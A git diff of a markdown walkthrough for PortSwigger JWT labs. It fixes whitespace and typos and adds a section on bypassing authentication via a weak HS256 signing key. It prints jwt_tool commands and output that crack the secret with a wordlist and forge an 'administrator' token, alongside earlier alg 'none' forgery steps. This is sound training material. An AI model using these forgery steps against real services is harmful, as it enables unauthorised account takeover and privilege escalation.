@@ -73,9 +73,9 @@ The impact of JWT attacks is usually severe. If an attacker is able to  create t
 
 **Explanation:** 
 
-​            By design, servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely  self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about  the original contents of the token, or even what the original signature  was. Therefore, if the server doesn't verify the signature properly,  there's nothing to stop an attacker from making arbitrary changes to the rest of the token.        
+​	By design, servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely  self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about  the original contents of the token, or even what the original signature  was. Therefore, if the server doesn't verify the signature properly,  there's nothing to stop an attacker from making arbitrary changes to the rest of the token.        
 
-​            For example, consider a JWT containing the following claims:        
+​	For example, consider a JWT containing the following claims:        
 
 ```json
 {    
@@ -84,9 +84,9 @@ The impact of JWT attacks is usually severe. If an attacker is able to  create t
 }
 ```
 
-​            If the server identifies the session based on this `username`, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the `isAdmin` value is used for access control, this could provide a simple vector for privilege escalation.        
+​	If the server identifies the session based on this `username`, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the `isAdmin` value is used for access control, this could provide a simple vector for privilege escalation.        
 
-​            In the first couple of labs, you'll see some examples of how these vulnerabilities might look in real-world applications.       
+​	In the first couple of labs, you'll see some examples of how these vulnerabilities might look in real-world applications.       
 
 **Resolution:**
 
@@ -209,7 +209,7 @@ jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
 
 **Explanation:** 
 
-​               Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the  token and, therefore, which algorithm it needs to use when verifying the signature.        
+​	Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the  token and, therefore, which algorithm it needs to use when verifying the signature.        
 
 ```json
 {
@@ -218,13 +218,13 @@ jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
 }
 ```
 
-​            This is inherently flawed because the server has no option  but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker  can directly influence how the server checks whether the token is  trustworthy.        
+​	This is inherently flawed because the server has no option  but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker  can directly influence how the server checks whether the token is  trustworthy.        
 
-​            JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as  this kind of filtering relies on string parsing, you can sometimes  bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.        
+​	JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as  this kind of filtering relies on string parsing, you can sometimes  bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.        
 
 **Resolution:**
 
-1. Login at **wiener** account, collect and analyse the JWT Tokent at **jwt.io** or **jwt_tool**.
+1. Login at **wiener** account, collect and analyse the JWT Token at **jwt.io** or **jwt_tool**.
 
 ```bash
 └─$ python3 jwt_tool.py eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoid2llbmVyIn0.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg   
@@ -262,7 +262,7 @@ nbf = NotBefore
 ----------------------
 ```
 
-2. Tamper "wiener" value to the "administrator" value using **jwt_tool** or other tool (JSON Web Tokens - Burp Suite Extension, JWT debugger, etc).
+2. Tamper the "wiener" value to the "administrator" value using **jwt_tool** or other tool (JSON Web Tokens - Burp Suite Extension, JWT debugger, etc).
 
 ```bash
 └─$ python3 jwt_tool.py eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoid2llbmVyIn0.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg -T
@@ -362,3 +362,111 @@ jwttool_f25032c0bc069765db80fd58114b1910 - EXPLOIT: "alg":"nOnE" - this is an ex
 <img align="center" src="screenshots/jwt_vulns/flawed_signature_verificaion/alg_none_burp.png">
 
 <img align="center" src="screenshots/jwt_vulns/flawed_signature_verificaion/alg_none_success.png">
+
+### JWT authentication bypass via weak signing key
+
+**Resources:**
+
+- **Lab:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
+- **AulasHack Video Resolution:** https://odysee.com/@AulasHack:4/jwt-authentication-bypass-via-weak:0?lid=1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba
+
+**Explanation:** 
+
+​	Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a  password, it's crucial that this secret can't be easily guessed or  brute-forced by an attacker. Otherwise, they may be able to create JWTs  with any header and payload values they like, then use the key to  re-sign the token with a valid signature.        
+
+​	When implementing JWT applications, developers sometimes  make mistakes like forgetting to change default or placeholder secrets.  They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this  case, it can be trivial for an attacker to brute-force a server's secret using a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).         
+
+**NOTE:** To brute force the secret key you can use **Hashcat**, **jwt_tool**, etc.
+
+**Resolution:**
+
+1. Login at **wiener** account, collect and bruteforce JWT Token using **jwt_tool** or **hashcat**.
+
+```bash
+python3 jwt_tool.py eyJraWQiOiJjMmFlZWMzNy02MDZkLTRmMjUtOTQwOC0xNWU2ZWMzNWYzOGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDkyMTA3OSwic3ViIjoid2llbmVyIn0.mks-KRNmV4JalJkcOTJO7fPbJnV4Xp7o5imU4_T3bls -C -d /usr/share/wordlists/rockyou.txt
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+[+] secret1 is the CORRECT key!
+You can tamper/fuzz the token contents (-T/-I) and sign it using:
+python3 jwt_tool.py [options here] -S hs256 -p "secret1"
+```
+
+2. Tamper the "wiener" value to the "administrator" value and sign the JWT using the secret found. To ease the attack, use **jwt_tool**.
+
+```bash
+└─$ python3 jwt_tool.py eyJraWQiOiJjMmFlZWMzNy02MDZkLTRmMjUtOTQwOC0xNWU2ZWMzNWYzOGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDkyMTA3OSwic3ViIjoid2llbmVyIn0.mks-KRNmV4JalJkcOTJO7fPbJnV4Xp7o5imU4_T3bls -T -S hs256 -p "secret1"              
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+
+====================================================================                                                                                                                         
+This option allows you to tamper with the header, contents and                                                                                                                               
+signature of the JWT.                                                                                                                                                                        
+====================================================================                                                                                                                         
+
+Token header values:                                                                                                                                                                         
+[1] kid = "c2aeec37-606d-4f25-9408-15e6ec35f38d"
+[2] alg = "HS256"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 0
+
+Token payload values:                                                                                                                                                                        
+[1] iss = "portswigger"
+[2] exp = 1714921079    ==> TIMESTAMP = 2024-05-05 11:57:59 (UTC)
+[3] sub = "wiener"
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 4
+Please enter new Key and hit ENTER
+> sub
+Please enter new value for sub and hit ENTER
+> administrator
+[1] iss = "portswigger"
+[2] exp = 1714921079    ==> TIMESTAMP = 2024-05-05 11:57:59 (UTC)
+[3] sub = "administrator"
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:                                                                                                                                                                
+(or 0 to Continue)                                                                                                                                                                           
+> 0
+jwttool_4552467d0649097eae708c85922f4c7a - Tampered token - HMAC Signing:
+[+] eyJraWQiOiJjMmFlZWMzNy02MDZkLTRmMjUtOTQwOC0xNWU2ZWMzNWYzOGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDkyMTA3OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.gwQR6BeYFCPy7UR7VMd2_I4QHPGvoFJP8AxUDzdqVss
+```
+
+3. Use Burp Repeater to access "admin" page.
+
+<img align="center" src="screenshots/jwt_vulns/weak_signing_key/tamp_jwt.png">
